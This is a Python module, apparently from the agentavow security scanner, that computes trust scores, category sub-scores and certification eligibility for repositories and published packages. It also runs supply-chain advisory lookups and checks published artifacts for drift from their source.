    """A+ 'Certified' eligibility — the 6-point conjunctive gate (roadmap §7). ALL
    must hold. Dormant (eligible=False) while artifact-scan/provenance are off —
    by design, A+ requires the cryptographic signals. Purely additive: this only
    gates the top A+ label, it never lowers a grade."""
    cov = result.coverage or {}
    prov = result.provenance or {}
    drift = result.drift or {}
    checks = {
        # 1. we scanned the published artifact, not just the repo
        "artifact_scanned": cov.get("scan_depth") in ("artifact", "artifact+live"),
        # 2. build provenance cryptographically binds artifact -> source
        "provenance_verified": (
            bool(prov.get("verified")) and bool(prov.get("source_matches_claim"))
        ),
        # 3. the published artifact matches its source (no injected/added files, no hook)
        # A registry-only package scan has no repo to diff against (drift is empty), so
        # its install hook is read from the artifact summary.
        "no_drift": not (
            drift.get("added_files") or drift.get("modified_files")
            or drift.get("has_install_hook")
            or (getattr(result, "artifact_scan", None) or {}).get("has_install_hook")
        ),
        # 4. zero BLOCKING (shipped/known-malicious) critical or high, and no MAL dep.
        # Uses the blocking counts so Certified agrees with the headline number/grade —
        # a finding only in a benchmark/test file doesn't secretly veto the top tier.
        "no_critical_or_high": (
            _blocking_crit_count(result) == 0 and _blocking_high_count(result) == 0
            and not any(f.name.startswith("Known-malicious") for f in result.findings)
        ),
        # 5. a signed, recomputable verdict (coverage block with pinned snapshots)
        "recompute_ready": bool(cov),
        # 6. no material coverage gaps (not a sampled / truncated scan)
        "full_coverage": not getattr(result, "sampled", False),
    }
    return {"eligible": all(checks.values()), "checks": checks}


def _dedupe_findings(findings: list) -> list:
    """Collapse identical findings to one per detection site, preserving order. A
    repo scan grades the repo tree AND the published artifact (same source), so the
    same detection would otherwise be scored twice. Key: (category, file, line, name).
    Dependency/lockfile findings key on name alone (file_path is always 'lockfile')."""
    seen: set = set()
    out: list = []
    for f in findings:
        cat = getattr(f, "category", None)
        key = (
            (cat, getattr(f, "name", None))
            if cat in _DEP_CATEGORIES
            else (cat, getattr(f, "file_path", None),
                  getattr(f, "line_number", None), getattr(f, "name", None))
        )
        if key in seen:
            continue
        seen.add(key)
        out.append(f)
    return out


# Max points the HIGH+MEDIUM code findings can subtract (before file-ratio scaling).
# Criticals are NOT capped by this. Tuned so a big trusted lib with legitimate repeated
# exec (pandas ≈17 highs) lands mid-grade, not F, while a handful of highs is unaffected.
_CODE_HM_DEDUCTION_CAP = 42

# Per-critical deduction (uncapped, never file-ratio-scaled). At 22, one critical drops a
# findings-baseline repo (68) into the Minimal tier (≤46 before highs), so a critical can
# never sit in the Trusted band — the property the old ×15 + MCP exemption violated.
_CRIT_DEDUCTION = 22

# Hard ceiling when a BLOCKING (shipped or known-malicious) critical exists: the number
# is floored inside the Minimal tier (31-50) so the score, tier, and colour can never read
# "Trusted/verified" over a real open critical — no matter how many positives offset it.
_CRITICAL_CEILING = 45

# Softer ceiling for a BLOCKING high (including a vulnerable direct/prod dependency): a
# tool with an open high can't sit in the top "verified" band or read a perfect 100 —
# it stays Trusted, just not pristine — so "high: 1" never coexists with 100/verified.
_HIGH_CEILING = 90

# Graduated curve for results with NO critical or high code finding (Kenne, 2026-10-08,
# #4): base 84 (no drop to the 68 findings base); each code medium costs a fixed 4 points
# (2 in an expected / declared category, the same 50% discount as above) times its
# shipped weight, total capped at 16; lows cost nothing. This replaces the 42 cap and the
# file-ratio scaling for these results only. Anything with a critical or high keeps the
# formula above unchanged.
_CURVE_BASE = 84
_CURVE_MEDIUM_COST = 4
_CURVE_MEDIUM_COST_EXPECTED = 2
_CURVE_MEDIUM_CAP = 16

# Evidence-confidence cap. A clean scan with very little to go on (a handful of files, no
# real code to analyze) is "we found nothing" — NOT "this is excellent". Left uncapped, a
# 4-file MCP wrapper with a README + license floats into the 90s next to thoroughly-vetted,
# well-tested projects, so a near-perfect score stops meaning "trustworthy" and starts
# meaning "small". The cap bounds the UPPER score by how much we could actually inspect;
# it never raises a score, and it's a no-op once real findings already lowered it. Tests are
# a genuine investment signal, so a tested small repo earns headroom back.
_EVIDENCE_MIN_FILES = 8        # below this = a thin scan
_EVIDENCE_VERY_THIN_FILES = 3  # at/under this = barely anything to inspect
_EVIDENCE_THIN_CAP = 82        # clean-but-thin: just under the 84 clean baseline
_EVIDENCE_VERY_THIN_CAP = 74   # clean-but-barely-scanned
_EVIDENCE_TESTS_HEADROOM = 5   # a tested small repo earns some of it back


# `.agentavow.yml` declared capabilities → the finding categories they legitimize.
# Conservative on purpose: env:read does NOT excuse secret findings, and network:egress
# does NOT excuse `exfiltration` (a lethal-trifecta data-theft signal) — only the
# generic remote-load surface. Criticals are never discounted by any of these.
_CAP_TO_CATEGORY: dict[str, str] = {
    "filesystem:read": "fs_access",
    "filesystem:write": "fs_access",
    "process:spawn": "unsafe_exec",
    "network:egress": "dynamic_remote_load",
}


def _declared_categories(result: ScanResult) -> set[str]:
    """Finding categories the tool DECLARED as intended scope via `.agentavow.yml`.
    These get the same softened (never-for-criticals) treatment as an MCP server's
    inherent capabilities — the honest, non-gaming way for a tool to say 'this is
    my job' about a high/medium finding."""
    scope = result.declared_scope if isinstance(result.declared_scope, dict) else {}
    if not scope.get("present"):
        return set()
    caps = scope.get("capabilities") or []
    return {_CAP_TO_CATEGORY[c] for c in caps if c in _CAP_TO_CATEGORY}


def _calculate_trust_score(result: ScanResult) -> int:
    """Calculate a trust score (0-100) based on findings and signals.

    Score considers:
    - Code finding counts by severity (deductions)
    - Dependency/supply-chain vulns via a separate bounded penalty
    - Positive security signals (bonuses)
    - Good practices: README, LICENSE, tests (bonuses)
    - File ratio: if findings are concentrated in few files, reduce penalty
    - No critical or high: the graduated curve (fixed medium cost, capped; lows free)
    """
    # Dependency vulns are scored separately (bounded); the general severity
    # model applies only to first-party CODE findings. Capabilities (what the tool
    # does — fixed-argv spawn, eval of its own expressions, …) are never a score input.
    code_findings = [f for f in result.findings
                     if f.category not in _DEP_CATEGORIES and _is_defect(f)]
    # Weight by shipped-vs-non-shipped: a finding in tests/fixtures/examples counts at
    # a fraction, so a big monorepo's test noise can't tank the grade of what it ships.
    code_critical = sum(_finding_grade_weight(f) for f in code_findings if f.severity == "critical")
    code_high = sum(_finding_grade_weight(f) for f in code_findings if f.severity == "high")
    code_medium = sum(_finding_grade_weight(f) for f in code_findings if f.severity == "medium")

    # Clean code starts high but NOT at a guaranteed 100 — hygiene bonuses below are
    # deliberately small so documentation can't float an unsafe tool to the top. A repo
    # with any real code findings starts lower and has to earn its way back.
    total_findings = code_critical + code_high + code_medium
    # No critical or high code finding (weighted): the graduated curve applies below.
    graduated = code_critical == 0 and code_high == 0
    score = _CURVE_BASE if graduated or total_findings < 0.5 else 68

    # High/medium findings in a tool's EXPECTED capability categories are discounted —
    # that's the tool's job. Two sources of "expected":
    #   1. MCP servers / media tools — fs access + subprocess exec are inherent to the type.
    #   2. `.agentavow.yml` DECLARED capabilities — the tool's own signed-off scope (item 3):
    #      e.g. declaring `network:egress` softens `dynamic_remote_load`.
    # A CRITICAL always deducts in full regardless — you can NOT declare away a critical
    # (so a malicious tool can't self-declare its way out of a real exfil/exec critical).
    expected_categories: set[str] = set()
    if result.is_mcp_server:
        expected_categories |= {"fs_access", "unsafe_exec"}
    elif result.is_media_tool:
        expected_categories |= {"fs_access"}
    expected_categories |= _declared_categories(result)

    if graduated:
        # Fixed cost per medium, no 42 cap, no file-ratio scaling (see _CURVE_* above).
        medium_cost = sum(
            _finding_grade_weight(f) * (_CURVE_MEDIUM_COST_EXPECTED
                                        if f.category in expected_categories
                                        else _CURVE_MEDIUM_COST)
            for f in code_findings if f.severity == "medium"
        )
        crit_ded = 0
        hm_ded = min(medium_cost, _CURVE_MEDIUM_CAP)
    elif expected_categories:
        exp_high = sum(
            _finding_grade_weight(f) for f in code_findings
            if f.severity == "high" and f.category in expected_categories
        )
        exp_medium = sum(
            _finding_grade_weight(f) for f in code_findings
            if f.severity == "medium" and f.category in expected_categories
        )
        oth_high = code_high - exp_high
        oth_medium = code_medium - exp_medium
        crit_ded = code_critical * _CRIT_DEDUCTION  # ALL criticals, full weight
        hm_ded = (
            oth_high * 8 + oth_medium * 3
            + exp_high * 4 + exp_medium * 1.5  # expected fs/exec at ~50%
        )
    else:
        # Standard deductions for non-MCP repos (code findings only)
        crit_ded = code_critical * _CRIT_DEDUCTION
        hm_ded = code_high * 8 + code_medium * 3

    # Saturating cap on the HIGH+MEDIUM code deduction (criticals stay UNCAPPED, so a
    # genuinely malicious repo — many criticals or a MAL dep — still floors to F). A
    # large, trusted library legitimately repeats the same pattern (pandas' expression
    # engine calls `eval`, its clipboard I/O calls `subprocess`) dozens of times; the
    # 30th instance is not 30× the risk of the first, and pure VOLUME of high findings
    # must not floor a whole library to 0. The cap only bites past ~5 highs, so small
    # repos are unaffected.
    capped_hm = hm_ded if graduated else min(int(hm_ded), _CODE_HM_DEDUCTION_CAP)

    # File-ratio scaling: if only a small percentage of files have issues, soften the
    # HIGH/MEDIUM deduction (a repo with 200 files and 5 findings in 3 files shouldn't be
    # hit as hard as one with issues in half its files). Criticals are NOT scaled — a
    # single critical must always bite, however large the repo. Not applied on the
    # graduated curve, where each medium has a fixed cost.
    if not graduated and result.files_scanned > 0 and total_findings > 0:
        affected_files = len({f.file_path for f in code_findings})
        ratio = affected_files / result.files_scanned
        # Scale factor: 0.4 at 1% affected, 1.0 at 25%+ affected
        scale = min(1.0, 0.4 + ratio * 2.4)
        capped_hm = int(capped_hm * scale)

    score -= crit_ded + capped_hm

    # Dependency/supply-chain vulns — separate bounded penalty (see helper).
    score -= _dependency_penalty(result.findings)

    # Phase 3 provenance/signing — a separate, additive signal (Kenne decision #4).
    # verified build provenance = small bonus; a package that CLAIMS provenance but
    # fails verification = small penalty; absent = 0 (N/A, never penalized). Empty
    # for scans without a package coordinate / with the flag off, so grades of
    # packages without provenance are unchanged.
    if isinstance(result.provenance, dict):
        score += int(result.provenance.get("score_delta", 0) or 0)

    # Phase 5 maintainer/behavioral — a separate, BOUNDED negative signal only
    # (Phase-5 policy). Clear negatives (archived/abandoned) deduct a small, capped
    # number of points; positives are folded into positive_signals above (so they
    # go through the standard +5-each bonus). Absent/unreadable → 0, never a
    # penalty; empty for scans with the flag off, so grades are unchanged.
    if isinstance(result.maintainer, dict):
        score += int(result.maintainer.get("score_delta", 0) or 0)

    # Bonuses for positive signals — small (capped +9). These are tie-breakers between
    # already-safe tools, NOT enough to lift a findings-laden repo to the top.
    unique_positives = set(result.positive_signals)
    score += min(len(unique_positives) * 3, 9)

    # Bonuses for good practices — hygiene is table stakes, worth a couple of points
    # each, not the 15 that used to floor every documented repo at ~95.
    if result.has_readme:
        score += 2
    if result.has_license:
        score += 2
    if result.has_tests:
        score += 2

    # Penalty for inline suppression (gaming deterrent)
    # First 3 are free (legitimate false-positive suppression).
    # After that, -3 per suppression — even moderate suppression is suspicious.
    # Rationale: hiding a critical saves 15pts but costs 3pts — still net positive
    # for the attacker, but much less favorable than the old 10-free / -2 scheme.
    if result.suppressed_count > 3:
        excess = result.suppressed_count - 3
        score -= excess * 3

    score = max(0, min(100, int(round(score))))

    # Evidence-confidence cap — bound the score by how much we could actually inspect, so a
    # thin scan can't read as "excellent" (see the constants above). Pure min(): never
    # raises a score, and a findings-laden repo already sits below the cap so it's a no-op
    # there. Skipped/unscannable scans never reach here (their score is null).
    files = result.files_scanned or 0
    if 0 <= files < _EVIDENCE_MIN_FILES:
        cap = _EVIDENCE_VERY_THIN_CAP if files <= _EVIDENCE_VERY_THIN_FILES else _EVIDENCE_THIN_CAP
        if result.has_tests:
            cap += _EVIDENCE_TESTS_HEADROOM
        score = min(score, cap)

    # A blocking (shipped / known-malicious) critical caps the NUMBER too — not just the
    # letter — so score/tier/colour agree with the grade. A non-shipped-only critical
    # (e.g. subprocess in a benchmark harness) does NOT floor: it's discounted everywhere
    # consistently and surfaced as a non-shipped finding, never as a headline critical.
    if _blocking_crit_count(result) > 0:
        score = min(score, _CRITICAL_CEILING)
    elif _blocking_high_count(result) > 0:
        score = min(score, _HIGH_CEILING)

    return score


def _calculate_category_scores(result: ScanResult) -> dict[str, int]:
    """Calculate per-category sub-scores (0-100) as independent axes.

    Categories: secret_hygiene, code_safety, data_handling, filesystem_access.
    Each starts at 100 and deducts based on severity-weighted findings.
    """
    # Map finding categories to score categories
    category_map = {
        "secret": "secret_hygiene",
        "unsafe_exec": "code_safety",
        "obfuscation": "code_safety",
        "dynamic_remote_load": "code_safety",
        "hidden_unicode": "code_safety",
        "prompt_injection": "code_safety",
        "insecure_deserialization": "code_safety",
        "exfiltration": "data_handling",
        "toxic_flow": "data_handling",
        # Caller-supplied URL reaches an outbound request unvalidated (SSRF, CVE-2026-14540
        # class): a data-handling axis concern.
        "ssrf": "data_handling",
        "fs_access": "filesystem_access",
        "dependency": "dependency_health",
        "install_hook": "dependency_health",
        # A published advisory against the package ITSELF affecting the scanned version.
        "known_vulnerability": "code_safety",
        # The maintainer retired the package (npm deprecated / PyPI yanked or Inactive).
        "maintenance": "dependency_health",
        # Git-config autorun (GitSpawn class) is a code-execution vector → code-safety axis.
        "git_autorun": "code_safety",
        # Phase 2: repo↔artifact drift (injected/modified files) is a code-safety axis.
        "artifact_drift": "code_safety",
        # MCP-native detectors — without these the evidence cards read all-green for a
        # server the headline grade already dinged (a lethal-trifecta / lying-annotation
        # server showed 100 on every axis).
        "schema_risk": "code_safety",
        "annotation_lie": "code_safety",
        "lethal_trifecta": "data_handling",
    }
    severity_weights = {"critical": 25, "high": 15, "medium": 8, "low": 3, "info": 0}

    scores: dict[str, int] = {
        "secret_hygiene": 100,
        "code_safety": 100,
        "data_handling": 100,
        "filesystem_access": 100,
        "dependency_health": 100,
    }

    # For MCP servers and media/audio tools, expected patterns get discounted
    expected_mcp_categories = {"unsafe_exec", "fs_access"} if result.is_mcp_server else set()
    # Media/TTS/audio tools legitimately read/write files
    if result.is_media_tool:
        expected_mcp_categories.add("fs_access")

    for finding in result.findings:
        # Dependency/supply-chain vulns use the bounded model below, not the
        # linear per-finding deduction (which would floor a monorepo to 0).
        if finding.category in _DEP_CATEGORIES:
            continue
        # A capability is reported, never deducted (same rule as the overall score).
        if not _is_defect(finding):
            continue
        score_cat = category_map.get(finding.category)
        if score_cat:
            deduction: float = severity_weights.get(finding.severity, 3)
            # Discount expected MCP patterns to 50% of normal penalty (fs/exec are the
            # tool's job) — but never discount a critical, and no longer the old 10% that
            # made the category axes read near-perfect for risky MCP servers.
            if finding.category in expected_mcp_categories and finding.severity != "critical":
                deduction = max(1.0, deduction * 0.5)
            # Non-shipped code (tests/fixtures/examples) counts at a fraction, so a
            # monorepo's test noise doesn't tank the category axes either.
            deduction *= _finding_grade_weight(finding)
            scores[score_cat] = max(0.0, scores[score_cat] - deduction)

    # dependency_health mirrors the bounded overall dependency penalty so the
    # category card and the grade tell the same story.
    scores["dependency_health"] = max(0, 100 - _dependency_penalty(result.findings))

    return {k: int(round(v)) for k, v in scores.items()}


def _dedupe_regex_vs_osv(result: ScanResult, osv_findings: list[Finding]) -> None:
    """Drop legacy regex ``dependency`` findings that OSV already covers.

    OSV findings name a concrete ``pkg@version (VULN-ID)``; the regex findings are
    ``Vulnerable dependency: <pkg>``. When OSV has flagged package ``X`` we remove
    the coarser regex finding for ``X`` so the same package isn't double-counted
    against the dependency subscore. Regex findings for packages OSV didn't cover
    (e.g. a range-only manifest with no lockfile pin) are kept.
    """
    osv_pkgs: set[str] = set()
    for f in osv_findings:
        # name form: "... : <name>@<version> (<id>)" — take the token before '@'.
        after_colon = f.name.split(": ", 1)[-1]
        pkg = after_colon.split("@", 1)[0].strip().lower()
        if pkg:
            osv_pkgs.add(pkg)
    if not osv_pkgs:
        return

    def _regex_pkg(f: Finding) -> str | None:
        if f.category != "dependency" or "Vulnerable dependency:" not in f.name:
            return None
        return f.name.split(":", 1)[-1].strip().lower()

    result.findings = [
        f for f in result.findings
        if not (_regex_pkg(f) is not None and _regex_pkg(f) in osv_pkgs)
    ]


async def _run_supply_chain(
    result: ScanResult,
    owner: str,
    repo: str,
    tree: list[dict],
    token: str | None,
    ref: str | None,
    sem,
    per_file_timeout: float,
    gaps: dict | None = None,
) -> None:
    """Phase 0 coverage block + Phase 1 OSV supply-chain pass (fail-open).

    ``gaps`` (the scan's coverage-gap dict) records what this pass could not check:
    lockfiles it could not fetch, and an advisory lookup that failed — so a failed
    lookup never reads the same as "no advisories". Disclosure only.

    Always attaches the Phase-0 ``coverage`` block (recompute discipline). When
    ``settings.scanner_use_osv`` is on it additionally fetches the repo's real
    lockfiles + workflow YAMLs, runs the OSV/deps.dev/Scorecard pipeline, folds
    the resulting CVE/GHSA/MAL findings into the scan, and pins every DB snapshot
    date into ``coverage.db_snapshots``. Any failure leaves the legacy regex
    findings untouched.
    """
    import asyncio

    from src.config import settings
    from src.scanner.coverage import (
        SCAN_DEPTH_REPO_ONLY,
        build_coverage,
        build_evidence_anchors,
    )

    repo_url = f"https://github.com/{owner}/{repo}"
    db_snapshots: dict[str, str] = {}
    sc_summary: dict = {}

    if getattr(settings, "scanner_use_osv", True):
        try:
            from src.scanner.supply_chain import analyze_supply_chain

            # Reuse the tree + raw fetch to pull lockfiles and workflow YAMLs.
            lock_names = {
                "package-lock.json", "yarn.lock", "pnpm-lock.yaml",
                "requirements.txt", "poetry.lock", "pipfile.lock",
                "cargo.lock", "go.sum",
            }
            lock_items = [
                it for it in tree
                if Path(it["path"]).name.lower() in lock_names
                and not _should_skip_path(it["path"])
                and _is_production_lockfile(it["path"])
            ][: settings.scanner_supply_chain_max_lockfiles]
            wf_items = [
                it for it in tree
                if it["path"].startswith(".github/workflows/")
                and it["path"].lower().endswith((".yml", ".yaml"))
            ][: settings.scanner_supply_chain_max_workflows]

            unread: list[str] = []

            async def _fetch(path: str) -> tuple[str, str]:
                try:
                    async with sem:
                        content = await asyncio.wait_for(
                            _fetch_file_content(owner, repo, path, token, ref=ref),
                            timeout=per_file_timeout,
                        )
                    if content is None:
                        unread.append(path)
                    return path, content or ""
                except (asyncio.TimeoutError, Exception):
                    unread.append(path)
                    return path, ""

            fetch_tasks = [_fetch(it["path"]) for it in (lock_items + wf_items)]
            fetched = await asyncio.gather(*fetch_tasks) if fetch_tasks else []
            if gaps is not None:
                # Unread lockfile paths (a set, so a file the regex pass also missed is
                # counted once); the caller turns it into ``dependency_files_unread``.
                gaps.setdefault("_dep_unread", set()).update(
                    p for p in unread if Path(p).name.lower() in lock_names)
            lockfiles = {
                p: c for p, c in fetched
                if Path(p).name.lower() in lock_names and c
            }
            workflow_texts = [
                c for p, c in fetched
                if p.startswith(".github/workflows/") and c
            ]

            # Reachability root: the repo's own published package, so deps.dev can
            # classify its lockfile's deps direct-vs-transitive (cross-ecosystem — npm
            # gets this from package-lock nesting; this covers pypi/crates). OSV
            # ecosystem ids, fail-open.
            root_coord = None
            try:
                _pc = await _resolve_repo_package(owner, repo, tree, token, ref)
                _eco = {"pypi": "PyPI", "crates": "crates.io", "npm": "npm"}.get(
                    _pc.get("surface", ""),
                )
                if _eco and _pc.get("name"):
                    root_coord = (_eco, _pc["name"], "")
            except Exception:
                root_coord = None

            sc = await analyze_supply_chain(
                lockfiles,
                owner=owner,
                repo=repo,
                workflow_texts=workflow_texts,
                root_coord=root_coord,
                use_depsdev=getattr(settings, "scanner_use_depsdev", True),
                use_scorecard=getattr(settings, "scanner_use_scorecard", True),
            )

            # Dedupe identical vulns that repeat across multiple lockfiles — the
            # same CVE on the same package@version must count once, not per-file.
            # The finding ``name`` encodes "<kind>: <pkg>@<version> (<vuln_id>)",
            # so it uniquely identifies a vuln — dedupe on it so the same CVE
            # repeated across lockfiles counts once.
            _seen_vulns: set = set()
            osv_findings = []
            for d in sc.findings:
                f = Finding(**d)
                if f.name in _seen_vulns:
                    continue
                _seen_vulns.add(f.name)
                osv_findings.append(f)

            advisory = getattr(settings, "scanner_osv_advisory", True)
            scored = False
            if sc.ok and osv_findings and not advisory:
                # Fold supply-chain findings into the scored grade only once the
                # aggregation is validated (advisory=False). Until then they are
                # collected + signed + surfaced but do not deduct.
                _dedupe_regex_vs_osv(result, osv_findings)
                result.findings.extend(osv_findings)
                scored = True
            if sc.ok and sc.deps_total and not any(
                p == "Dependency pinning" for p in result.positive_signals
            ):
                result.positive_signals.append("Dependency pinning")
            if gaps is not None and not sc.ok and getattr(sc, "error", None):
                gaps["advisory_lookup"] = "failed"
            db_snapshots = dict(sc.db_snapshots)
            sc_summary = {
                "ok": sc.ok,
                "advisory": advisory,
                "scored": scored,
                "deps_total": sc.deps_total,
                "lockfiles_scanned": len(lockfiles),
                "unique_vulns": len(osv_findings),
                "ecosystems": sc.ecosystems,
                "counts": sc.counts,
                "malicious": sc.malicious,
                "scorecard": sc.scorecard,
                "github_depth": sc.github_depth,
                "db_snapshots": sc.db_snapshots,
            }
        except Exception:
            if gaps is not None:
                gaps["advisory_lookup"] = "failed"
            logger.warning(
                "Supply-chain pass errored for %s/%s — keeping regex deps",
                owner, repo, exc_info=True,
            )

    # Phase 0 coverage block — always emitted (recompute discipline).
    result.coverage = build_coverage(
        surface="github",
        repo_url=repo_url,
        commit=ref,
        scan_depth=SCAN_DEPTH_REPO_ONLY,
        db_snapshots=db_snapshots,
    )
    result.coverage["evidence_anchors"] = build_evidence_anchors()
    result.supply_chain = sc_summary


async def _release_tree_shas(
    owner: str, repo: str, version: str, token: str | None,
) -> dict[str, str] | None:
    """``{path: git-blob-sha}`` of the repo AT the release tag for ``version`` (tries
    ``v{version}`` then ``{version}``), or None when no matching tag resolves.

    This is what lets the artifact scan diff a published package against its OWN
    tagged source instead of the default branch — which for an active repo has moved
    on since the release, producing spurious "ships/modifies N files" drift. GitHub's
    tree entry ``sha`` is the git blob SHA, so one tree call (no content fetch) gives
    the whole comparison basis.
    """
    if not version:
        return None
    headers = {"Accept": "application/vnd.github+json"}
    if token:
        headers["Authorization"] = f"token {token}"
    async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True) as client:
        for tag in (f"v{version}", version):
            try:
                resp = await client.get(
                    f"https://api.github.com/repos/{owner}/{repo}/git/trees/{tag}",
                    headers=headers, params={"recursive": "1"},
                )
            except httpx.HTTPError:
                continue
            await _note_github(resp, f"release tree {owner}/{repo}@{tag}")
            if resp.status_code != 200:
                continue
            body = resp.json()
            shas = {
                it["path"]: it["sha"]
                for it in body.get("tree", [])
                if it.get("type") == "blob" and it.get("path") and it.get("sha")
            }
            if shas:
                return shas
    return None


_GH_SLUG_RE = re.compile(r"github\.com[/:]([\w.-]+/[\w.-]+?)(?:\.git|/|#|\?|$)", re.IGNORECASE)
_SHORTHAND_RE = re.compile(r"^(?:github:)?([\w.-]+/[\w.-]+?)(?:\.git)?$", re.IGNORECASE)


def _github_slug(url: str, *, allow_shorthand: bool = False) -> str | None:
    """The lowercased ``owner/repo`` a declared source URL points at, or None.

    Handles ``git+https://github.com/o/r.git``, ``git@github.com:o/r.git``, monorepo
    subpaths (``github.com/o/r/tree/main/packages/x``) and, for npm's ``repository``
    field, the ``o/r`` / ``github:o/r`` shorthands."""
    if not isinstance(url, str) or not url.strip():
        return None
    m = _GH_SLUG_RE.search(url)
    if m:
        return m.group(1).lower()
    if allow_shorthand:
        m = _SHORTHAND_RE.match(url.strip())
        if m and ":" not in url.replace("github:", ""):
            return m.group(1).lower()
    return None


async def _published_pkg_meta(ecosystem: str, name: str) -> tuple[list[str], dict | None]:
    """The GitHub ``owner/repo`` slugs a PUBLISHED npm/PyPI/crates package declares as
    its source (repository field first, then homepage/project URLs), plus the npm
    latest-version manifest (None elsewhere). ``([], None)`` when the package doesn't
    exist or the registry can't be reached."""
    urls: list[tuple[str, bool]] = []  # (url, shorthand allowed)
    manifest: dict | None = None
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True) as client:
            if ecosystem == "pypi":
                resp = await client.get(f"https://pypi.org/pypi/{name}/json")
                if resp.status_code != 200:
                    return [], None
                info = (resp.json() or {}).get("info", {}) or {}
                urls = [(v, False) for v in (info.get("project_urls") or {}).values()
                        if isinstance(v, str)]
                if isinstance(info.get("home_page"), str):
                    urls.append((info["home_page"], False))
            elif ecosystem == "npm":
                # The latest-version manifest: small (the full packument for a big
                # package is many MB) and it carries repository, deps, keywords, bin.
                resp = await client.get(f"https://registry.npmjs.org/{name}/latest")
                if resp.status_code != 200:
                    return [], None
                data = resp.json() or {}
                if isinstance(data, dict):
                    manifest = data
                    repo_field = data.get("repository")
                    if isinstance(repo_field, str):
                        urls.append((repo_field, True))
                    elif isinstance(repo_field, dict) and isinstance(repo_field.get("url"), str):
                        urls.append((repo_field["url"], True))
                    if isinstance(data.get("homepage"), str):
                        urls.append((data["homepage"], False))
            elif ecosystem == "crates":
                resp = await client.get(
                    f"https://crates.io/api/v1/crates/{name}",
                    headers={"User-Agent": "agentavow-scanner (https://agentavow.com)"},
                )
                if resp.status_code != 200:
                    return [], None
                crate = (resp.json() or {}).get("crate", {}) or {}
                for k in ("repository", "homepage"):
                    if isinstance(crate.get(k), str):
                        urls.append((crate[k], False))
    except (httpx.HTTPError, ValueError, TypeError):
        return [], None
    slugs: list[str] = []
    for u, shorthand in urls:
        slug = _github_slug(u, allow_shorthand=shorthand)
        if slug and slug not in slugs:
            slugs.append(slug)
    return slugs, manifest


PACKAGE_UNCONFIRMED_NOTE = "no published package confirmed for this repo"


async def _package_points_back(owner: str, repo: str, ecosystem: str, name: str) -> bool:
    """True only when the published ``ecosystem``/``name`` package's own registry entry
    names ``owner/repo`` as its source. The single gate for using a published package as
    a repo's artifact (scan, sandbox, provenance, install). Fail-closed: no registry
    answer, no repo declared, or a different repo declared all return False."""
    if ecosystem not in ("npm", "pypi", "crates") or not name:
        return False
    slugs, _ = await _published_pkg_meta(ecosystem, name)
    return f"{owner}/{repo}".lower() in slugs


async def _verified_package_coordinate(
    owner: str, repo: str, surface: str, name: str,
) -> dict:
    """``{"surface", "name", "is_mcp_server"}`` only when the published package's own
    registry entry points back at ``owner/repo``; ``{}`` otherwise.

    This gates the 1-click install on a repo page. A manifest name alone isn't proof:
    vercel/next.js's private workspace root is named ``nextjs-project``, and an
    unrelated npm package of that name exists. Fail-closed: no registry answer, no
    install."""
    if surface not in ("npm", "pypi", "crates") or not name:
        return {}
    slugs, manifest = await _published_pkg_meta(surface, name)
    if f"{owner}/{repo}".lower() not in slugs:
        return {}
    return {
        "surface": surface,
        "name": name,
        "is_mcp_server": _looks_like_mcp_server(surface, name, manifest),
    }


async def _maybe_scan_artifact(
    result: ScanResult,
    owner: str,
    repo: str,
    tree: list[dict],
    token: str | None,
    ref: str | None,
    artifact: tuple[str, str, str | None] | None,
    repo_text_hashes: dict[str, str],
) -> None:
    """Phase 2 — fetch + scan the PUBLISHED artifact and record repo↔artifact drift.

    Feature-flagged (``settings.scanner_scan_artifact``, default OFF) and FAIL-OPEN:
    any resolve/download/unpack error leaves the repo-only grade + coverage
    untouched. When it succeeds it folds artifact findings (install hooks, injected/
    modified files, plus every 12-category detector run over the real tree) into the
    scan and upgrades ``coverage.scan_depth`` to ``"artifact"`` with the exact
    artifact ``sha256`` digest and a pinned registry snapshot date.
    """
    from src.config import settings

    if not getattr(settings, "scanner_scan_artifact", False):
        return

    # Resolve the artifact from the repo's OWN manifest (accurate registry name),
    # not the bare repo-folder guess — a folder-name collision would diff against an
    # unrelated package and attribute its drift + deps to this repo.
    coord = artifact or await _accurate_artifact_coord(owner, repo, tree, token, ref)
    if not coord:
        return
    ecosystem, name, version = coord

    # Package-identity gate: scan the published package as this repo's artifact ONLY
    # when its own registry entry points back at this repo. A manifest name alone isn't
    # proof — vercel/next.js's root manifest is named `nextjs-project`, and a stranger's
    # npm package of that name (declaring no repo) was being scanned and run in the
    # sandbox as next.js. No repo declared, a different repo, or no registry answer all
    # skip, and the result says so; the repo is graded from its source alone.
    if not await _package_points_back(owner, repo, ecosystem, name):
        logger.info(
            "artifact scan skipped: %s package %r doesn't point back at %s/%s",
            ecosystem, name, owner, repo,
        )
        result.artifact_scan = {
            "ok": False, "skipped": "unconfirmed", "ecosystem": ecosystem,
            "name": name, "note": PACKAGE_UNCONFIRMED_NOTE,
        }
        return

    try:
        from src.scanner.artifact_scan import scan_published_artifact

        # Repo path set (from the full tree — no extra network) drives added-file
        # drift; the fetched text hashes drive modified-file drift.
        repo_paths = {it["path"] for it in tree if it.get("type") == "blob"}

        async def _resolve_release_shas(v: str):
            return await _release_tree_shas(owner, repo, v, token)

        art = await scan_published_artifact(
            ecosystem, name, version,
            repo_paths=repo_paths,
            repo_text_hashes=repo_text_hashes,
            release_shas_resolver=_resolve_release_shas,
        )
    except Exception:
        logger.warning("Artifact scan wiring failed for %s/%s — repo-only stands",
                       owner, repo, exc_info=True)
        return

    if not art.ok:
        result.artifact_scan = {"ok": False, "error": art.error,
                                "ecosystem": ecosystem, "name": name}
        return

    # Fold artifact findings into the scored grade and record drift.
    result.findings.extend(art.findings)
    result.drift = art.drift
    result.artifact_scan = {
        "ok": True,
        "ecosystem": art.ecosystem,
        "name": art.name,
        "version": art.version,
        "kind": art.kind,
        "digest": art.digest,
        "download_url": art.download_url,
        "files_scanned": art.files_scanned,
        "file_count": art.file_count,
        "unpacked_size": art.unpacked_size,
        "drift": art.drift,
    }
    if getattr(art, "skipped", None):
        # The bounded unpack left members out (too large / past the budget): disclose it.
        result.artifact_scan["skipped"] = art.skipped

    # Upgrade the coverage block: scan_depth=artifact + the real artifact digest +
    # a pinned registry snapshot date (Phase 0 recompute discipline).
    from src.scanner.coverage import SCAN_DEPTH_ARTIFACT

    if not isinstance(result.coverage, dict):
        result.coverage = {}
    result.coverage["surface"] = art.ecosystem
    result.coverage["scan_depth"] = SCAN_DEPTH_ARTIFACT
    if art.digest:
        result.coverage["artifact_digest"] = art.digest
